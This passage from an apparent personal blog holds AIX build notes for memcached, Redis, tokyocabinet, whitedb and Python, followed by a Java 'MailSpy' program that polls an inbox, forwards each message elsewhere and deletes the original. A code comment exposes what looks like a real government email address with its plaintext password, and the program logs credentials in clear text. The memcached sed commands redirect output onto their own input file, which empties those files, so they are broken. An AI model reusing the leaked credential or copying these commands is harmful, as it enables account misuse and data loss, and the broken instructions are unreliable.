<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;s/thread_init/thread_init_memcached/g&#x27; memcached.h &gt; memcached.h</span><br><span class="line">sed &#x27;s/thread_init/thread_init_memcached/g&#x27; memcached.c &gt; memcached.c</span><br><span class="line">sed &#x27;s/thread_init/thread_init_memcached/g&#x27; thread.c &gt; thread.c</span><br></pre></td></tr></table></figure>
</li>
<li><p>Problem<br>  Can’t enable threads without the POSIX thread library.</p>
</li>
<li><p>Solve<br>  Remove “-Wl,-rpath,$ledir&#x2F;lib” in file configure</p>
</li>
<li><p>Reference<br><a target="_blank" rel="noopener" href="http://rikugun.iteye.com/blog/982739">AIX 下安装 memcached</a></p>
</li>
</ul>
<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><ul>
<li><p>Download redis from <a target="_blank" rel="noopener" href="http://www.perzl.org/aix/index.php?n=Main.Redis">http://www.perzl.org/aix/index.php?n=Main.Redis</a></p>
</li>
<li><p>Download dependencies from <a target="_blank" rel="noopener" href="http://www.bullfreeware.com/">http://www.bullfreeware.com/</a></p>
</li>
<li><p>check dependency <code>rpm -qRp redis-2.6.16-1.aix5.2.ppc.rpm</code></p>
</li>
<li><p>check file list </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpm -qlp redis-2.6.16-1.aix5.2.ppc.rpm`</span><br><span class="line">rpm -ivh logrotate-3.8.3-1</span><br><span class="line">rpm -ivh popt-1.16-2</span><br><span class="line">rpm -ivh coreutils-8.21-1</span><br></pre></td></tr></table></figure>
</li>
<li><p>Reference<br><a target="_blank" rel="noopener" href="http://gqglblog.sinaapp.com/?cat=3">Redis 2.4持久化测试报告</a><br><a target="_blank" rel="noopener" href="http://nosql-database.org/">nosql-database</a></p>
</li>
</ul>
<h1 id="tokyocabinet"><a href="#tokyocabinet" class="headerlink" title="tokyocabinet"></a>tokyocabinet</h1><ul>
<li>Download tokyocabinet-1.4.48 from <a target="_blank" rel="noopener" href="http://fallabs.com/tokyocabinet/">http://fallabs.com/tokyocabinet/</a> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/home/action/tokyocabinet</span><br><span class="line">sed &#x27;s/-Wl,-soname,libtokyocabinet.so.$(LIBVER)//g&#x27; Makefile &gt; Makefile.bak</span><br><span class="line">mv Makefile.bak Makefile</span><br><span class="line">gmake</span><br><span class="line">gmake install</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="whitedb"><a href="#whitedb" class="headerlink" title="whitedb"></a>whitedb</h1><ul>
<li>Download whitedb-0.6.1 from <a target="_blank" rel="noopener" href="http://whitedb.org/">http://whitedb.org</a> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/home/action/whitedb --with-python // found python binding not work</span><br><span class="line">sed &#x27;s/LIBS = -lm /LIBS = -lm -lpthread /g&#x27; Makefile &gt; Makefile.bak</span><br><span class="line">mv Makefile.bak Makefile</span><br><span class="line">gmake</span><br><span class="line">gmake install</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Package-in-my-AIX"><a href="#Package-in-my-AIX" class="headerlink" title="Package in my AIX"></a>Package in my AIX</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa</span><br><span class="line"></span><br><span class="line">rsync-3.0.6-1</span><br><span class="line">tcl-8.4.7-3</span><br><span class="line">tk-8.4.7-3</span><br><span class="line">expect-5.42.1-3</span><br><span class="line">bash-4.2-1</span><br><span class="line">AIX-rpm-7.1.1.15-2</span><br><span class="line">gettext-0.17-8</span><br><span class="line">gdbm-1.10-1</span><br><span class="line">libiconv-1.14-1</span><br><span class="line">ncurses-5.9-3</span><br><span class="line">info-5.0-2</span><br><span class="line">readline-6.2-3</span><br><span class="line">sqlite-3.7.15.2-2</span><br><span class="line">gmp-5.1.3-1</span><br><span class="line">db-4.8.24-4</span><br><span class="line">zlib-1.2.5-6</span><br><span class="line">libffi-3.0.9-3</span><br><span class="line">bzip2-1.0.6-2</span><br><span class="line">expat-2.1.0-1</span><br><span class="line">python-2.7.2-3</span><br><span class="line">mpfr-3.1.2-1</span><br><span class="line">libmpc-0.9-1</span><br><span class="line">logrotate-3.8.3-1</span><br><span class="line">libgcc-4.8.1-1</span><br><span class="line">zlib-devel-1.2.5-6</span><br><span class="line">bzip2-devel-1.0.6-2</span><br><span class="line">gcc-4.8.1-1</span><br><span class="line">gcc-cpp-4.8.1-1</span><br><span class="line">libstdc++-4.8.1-1</span><br><span class="line">libstdc++-devel-4.8.1-1</span><br><span class="line">gcc-c++-4.8.1-1</span><br><span class="line">make-3.82-2</span><br><span class="line">popt-1.16-2</span><br><span class="line">coreutils-8.21-1</span><br><span class="line">redis-2.6.16-1</span><br><span class="line">python-memcached-1.53-1</span><br><span class="line">python-devel-2.7.2-3</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-Python-in-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-11-15T03:54:38.000Z"><a href="/2013/11/15/Install-Python-in-AIX/">2013-11-15</a></time>
      
      
  
    <h1 class="title"><a href="/2013/11/15/Install-Python-in-AIX/">Install Python in AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Download-Python"><a href="#Download-Python" class="headerlink" title="Download Python"></a>Download Python</h1><p>download the archive zip from <a target="_blank" rel="noopener" href="http://www.bullfreeware.com/affichage.php?id=1495">http://www.bullfreeware.com/affichage.php?id=1495</a></p>
<h1 id="Install-Python"><a href="#Install-Python" class="headerlink" title="Install Python"></a>Install Python</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh libiconv-1.14-1.aix6.1.ppc.rpm –nodeps // important, otherwise throw error of libintl.so </span><br><span class="line">rpm -ivh gettext-0.17-8.aix6.1.ppc.rpm –nodeps </span><br><span class="line">rpm -ivh gdbm-1.10-1.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh ncurses-5.9-3.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh info-5.0-2.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh readline-6.2-3.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh sqlite-3.7.15.2-2.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh gmp-5.1.3-1.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh db-4.8.24-4.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh zlib-1.2.5-6.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh libffi-3.0.9-3.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh bzip2-1.0.6-2.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh expat-2.1.0-1.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh openssl-1.0.0k-2.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh python-2.7.2-3.aix6.1.ppc.rpm </span><br><span class="line">rpm -ivh python-devel-2.7.2-3.aix6.1.ppc.rpm</span><br></pre></td></tr></table></figure>

<h1 id="Create-Makefile-amp-pyconfig-h-Sovled-after-install-python-devel-2-7-2-3-aix6-1-ppc-rpm"><a href="#Create-Makefile-amp-pyconfig-h-Sovled-after-install-python-devel-2-7-2-3-aix6-1-ppc-rpm" class="headerlink" title="Create Makefile &amp; pyconfig.h (Sovled after install python-devel-2.7.2-3.aix6.1.ppc.rpm)"></a>Create Makefile &amp; pyconfig.h (Sovled after install <code>python-devel-2.7.2-3.aix6.1.ppc.rpm</code>)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/freeware/lib/python2.7/config touch /opt/freeware/lib/python2.7/config/Makefile</span><br><span class="line">mkdir /opt/freeware/include/python2.7 touch /opt/freeware/include/python2.7/pyconfig.h</span><br></pre></td></tr></table></figure>

<h1 id="Problem-solve"><a href="#Problem-solve" class="headerlink" title="Problem solve"></a>Problem solve</h1><ul>
<li>No module <em>unittest</em> found</li>
<li>copy unittest from windows to aix</li>
<li>aix not support “O_NOFOLLOW”<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/pypa/pip/pull/935">https://github.com/pypa/pip/pull/935</a><br> <code>sudo vi /opt/freeware/lib/python2.7/site-packages/pip-1.4.1-py2.7.egg/pip/locations.py</code><br> remove os.O_NOFOLLOW</li>
</ul>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-mail-spy" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-11-14T06:16:53.000Z"><a href="/2013/11/14/mail-spy/">2013-11-14</a></time>
      
      
  
    <h1 class="title"><a href="/2013/11/14/mail-spy/">mail spy</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="MailSpy-java"><a href="#MailSpy-java" class="headerlink" title="MailSpy.java"></a>MailSpy.java</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br></pre></td><td class="code"><pre><span class="line">package forest;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.security.Security;</span><br><span class="line">import java.text.SimpleDateFormat;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">import java.util.ResourceBundle;</span><br><span class="line">import java.util.logging.FileHandler;</span><br><span class="line">import java.util.logging.Formatter;</span><br><span class="line">import java.util.logging.LogRecord;</span><br><span class="line">import java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line">import javax.activation.DataHandler;</span><br><span class="line">import javax.mail.Authenticator;</span><br><span class="line">import javax.mail.Flags;</span><br><span class="line">import javax.mail.Folder;</span><br><span class="line">import javax.mail.Message;</span><br><span class="line">import javax.mail.MessagingException;</span><br><span class="line">import javax.mail.Part;</span><br><span class="line">import javax.mail.PasswordAuthentication;</span><br><span class="line">import javax.mail.Session;</span><br><span class="line">import javax.mail.Store;</span><br><span class="line">import javax.mail.Transport;</span><br><span class="line">import javax.mail.internet.AddressException;</span><br><span class="line">import javax.mail.internet.InternetAddress;</span><br><span class="line">import javax.mail.internet.MimeBodyPart;</span><br><span class="line">import javax.mail.internet.MimeMessage;</span><br><span class="line">import javax.mail.internet.MimeMultipart;</span><br><span class="line"></span><br><span class="line">import com.sun.net.ssl.internal.ssl.Provider;</span><br><span class="line"></span><br><span class="line">public class MailSpy &#123;</span><br><span class="line">	public static Logger log = Logger.getLogger(&quot;MailSpy&quot;);</span><br><span class="line">	private static ResourceBundle mailProperties = ResourceBundle.getBundle(&quot;forest.mail&quot;);</span><br><span class="line"></span><br><span class="line">	private static String username;</span><br><span class="line">	private static String password;</span><br><span class="line">	private static Properties props = new Properties();</span><br><span class="line">	private static SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line"></span><br><span class="line">	static &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			FileHandler fh = new FileHandler(mailProperties.getString(&quot;logFile&quot;));</span><br><span class="line">			fh.setFormatter(new Formatter() &#123;</span><br><span class="line">				@Override</span><br><span class="line">				public String format(LogRecord record) &#123;</span><br><span class="line">					return String.format(&quot;%s [%s] - %s\n&quot;, sf.format(record.getMillis()), record.getLevel(), record</span><br><span class="line">							.getMessage());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">			log.addHandler(fh);</span><br><span class="line">		&#125; catch (SecurityException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Security.addProvider(new Provider());</span><br><span class="line">		System.setProperty(&quot;javax.net.ssl.trustStore&quot;, mailProperties.getString(&quot;jssecacerts&quot;));</span><br><span class="line"></span><br><span class="line">		for (String key : mailProperties.keySet()) &#123;</span><br><span class="line">			props.setProperty(key, mailProperties.getString(key));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		username = mailProperties.getString(&quot;username&quot;);</span><br><span class="line">		password = mailProperties.getString(&quot;password&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		while (true) &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				MailSpy util = new MailSpy();</span><br><span class="line">				MailMessage mailMessage = util.getMail();</span><br><span class="line">				if (mailMessage != null) &#123;</span><br><span class="line">					log.info(&quot;foward mail&quot;);</span><br><span class="line">					util.forwardMail(mailMessage);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; catch (Exception e) &#123;</span><br><span class="line">				log.severe(e.getMessage());</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			try &#123;</span><br><span class="line">				Thread.sleep(10000);</span><br><span class="line">			&#125; catch (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 *  pharmgeneral@dh.gov.hk pass0424 </span><br><span class="line">	 */</span><br><span class="line">	public void forwardMail(MailMessage mailMessage) throws AddressException, MessagingException &#123;</span><br><span class="line">		Session session = Session.getDefaultInstance(props, new MyAuthenticator(username, password));</span><br><span class="line">		session.setDebug(false);</span><br><span class="line">		MimeMessage msg = new MimeMessage(session);</span><br><span class="line"></span><br><span class="line">		if (!mailMessage.getBodyPart().isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">			MimeMultipart multipart = new MimeMultipart();</span><br><span class="line">			for (MimeBodyPart body : mailMessage.getBodyPart()) &#123;</span><br><span class="line">				multipart.addBodyPart(body);</span><br><span class="line">			&#125;</span><br><span class="line">			msg.setContent(multipart);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			msg.setText(mailMessage.getBodyText());</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//msg.setFrom(new InternetAddress(mailMessage.getFrom()));</span><br><span class="line">		msg.setFrom(new InternetAddress(username));</span><br><span class="line"></span><br><span class="line">		msg.setSender(new InternetAddress(mailMessage.getFrom()));</span><br><span class="line">		msg.setRecipients(Message.RecipientType.TO, mailProperties.getString(&quot;forwardTo&quot;));</span><br><span class="line">		//msg.setRecipients(Message.RecipientType.TO, &quot;PRS2.AP1@hp.com&quot;);</span><br><span class="line"></span><br><span class="line">		log.config(&quot;Sender &quot; + mailMessage.getFrom() + &quot;, Cc &quot; + mailProperties.getString(&quot;forwardTo&quot;));</span><br><span class="line"></span><br><span class="line">		msg.setSubject(mailMessage.getSubject());</span><br><span class="line"></span><br><span class="line">		msg.setSentDate(mailMessage.getSent());</span><br><span class="line">		Transport.send(msg);</span><br><span class="line"></span><br><span class="line">		log.info(&quot;subject: &quot; + mailMessage.getSubject() + &quot; is sent.&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public MailMessage getMail() &#123;</span><br><span class="line">		Session session = Session.getDefaultInstance(props, new MyAuthenticator(username, password));</span><br><span class="line">		Store store = null;</span><br><span class="line">		MailMessage mailMessage = null;</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line">			session.setDebug(false);</span><br><span class="line">			store = session.getStore();</span><br><span class="line">			store.connect();</span><br><span class="line"></span><br><span class="line">			Folder folder = store.getFolder(&quot;INBOX&quot;);</span><br><span class="line">			folder.open(Folder.READ_WRITE);</span><br><span class="line"></span><br><span class="line">			int count = folder.getMessageCount();</span><br><span class="line">			if (count == 0) &#123;</span><br><span class="line">				log.info(&quot;no message&quot;);</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				mailMessage = new MailMessage();</span><br><span class="line">				Message message = folder.getMessage(1);</span><br><span class="line"></span><br><span class="line">				Object content = message.getContent();</span><br><span class="line"></span><br><span class="line">				mailMessage.setFrom(InternetAddress.toString(message.getFrom()));</span><br><span class="line"></span><br><span class="line">				//mailMessage.setReplyTo(InternetAddress.toString(message.getReplyTo()));</span><br><span class="line"></span><br><span class="line">				//mailMessage.setTo(InternetAddress.toString(message.getRecipients(Message.RecipientType.TO)));</span><br><span class="line"></span><br><span class="line">				//mailMessage.setCc(InternetAddress.toString(message.getRecipients(Message.RecipientType.CC)));</span><br><span class="line"></span><br><span class="line">				mailMessage.setSubject(message.getSubject());</span><br><span class="line"></span><br><span class="line">				mailMessage.setSent(message.getSentDate());</span><br><span class="line"></span><br><span class="line">				if (content instanceof MimeMultipart) &#123;</span><br><span class="line">					MimeMultipart mp = (MimeMultipart) content;</span><br><span class="line">					for (int i = 0, n = mp.getCount(); i &lt; n; i++) &#123;</span><br><span class="line"></span><br><span class="line">						Part part = mp.getBodyPart(i);</span><br><span class="line">						DataHandler hd = part.getDataHandler();</span><br><span class="line"></span><br><span class="line">						MimeBodyPart messageBodyPart = new MimeBodyPart();</span><br><span class="line">						messageBodyPart.setDataHandler(new DataHandler(hd.getDataSource()));</span><br><span class="line">						mailMessage.getBodyPart().add(messageBodyPart);</span><br><span class="line"></span><br><span class="line">						/*String disposition = part.getDisposition();</span><br><span class="line">						if (disposition == null) &#123;</span><br><span class="line">							DataHandler hd = part.getDataHandler();</span><br><span class="line"></span><br><span class="line">							MimeBodyPart messageBodyPart = new MimeBodyPart();</span><br><span class="line">							messageBodyPart.setDataHandler(new DataHandler(hd.getDataSource()));</span><br><span class="line">							//messageBodyPart.setFileName(fileName);</span><br><span class="line"></span><br><span class="line">							mailMessage.getBodyPart().add(messageBodyPart);</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						if ((disposition != null)</span><br><span class="line">								&amp;&amp; (disposition.equals(Part.ATTACHMENT) || (disposition.equals(Part.INLINE)))) &#123;</span><br><span class="line">							String fileName = part.getFileName();</span><br><span class="line">							log.info(&quot;file name: &quot; + fileName);</span><br><span class="line">							InputStream in = part.getInputStream();</span><br><span class="line"></span><br><span class="line">							ByteArrayDataSource dataSource = new ByteArrayDataSource(in, part.getContentType());</span><br><span class="line">							MimeBodyPart messageBodyPart = new MimeBodyPart();</span><br><span class="line">							messageBodyPart.setDataHandler(new DataHandler(dataSource));</span><br><span class="line">							messageBodyPart.setFileName(fileName);</span><br><span class="line"></span><br><span class="line">							mailMessage.getBodyPart().add(messageBodyPart);</span><br><span class="line">						&#125;*/</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					log.info(&quot;content of text/plain &quot; + content);</span><br><span class="line">					mailMessage.setBodyText(content.toString());</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				message.setFlag(Flags.Flag.DELETED, true);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			folder.close(true);</span><br><span class="line"></span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; finally &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				log.fine(&quot;store closed&quot;);</span><br><span class="line">				store.close();</span><br><span class="line">			&#125; catch (MessagingException e) &#123;</span><br><span class="line">				// TODO Auto-generated catch block</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return mailMessage;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyAuthenticator extends Authenticator &#123;</span><br><span class="line">	private String username;</span><br><span class="line">	private String password;</span><br><span class="line"></span><br><span class="line">	public MyAuthenticator(String username, String password) &#123;</span><br><span class="line">		this.username = username;</span><br><span class="line">		this.password = password;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	protected PasswordAuthentication getPasswordAuthentication() &#123;</span><br><span class="line">		MailSpy.log.config(&quot;username &quot; + username + &quot; , password &quot; + password);</span><br><span class="line">		return new PasswordAuthentication(username, password);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MailMessage &#123;</span><br><span class="line">	private String from;</span><br><span class="line">	private String replyTo;</span><br><span class="line">	private String to;</span><br><span class="line">	private String cc;</span><br><span class="line">	private Date sent;</span><br><span class="line">	private String subject;</span><br><span class="line">	private String bodyText;</span><br><span class="line">	private List&lt;MimeBodyPart&gt; bodyPart = new ArrayList&lt;MimeBodyPart&gt;();</span><br><span class="line"></span><br><span class="line">	public String getFrom() &#123;</span><br><span class="line">		return from;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setFrom(String from) &#123;</span><br><span class="line">		this.from = from;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getReplyTo() &#123;</span><br><span class="line">		return 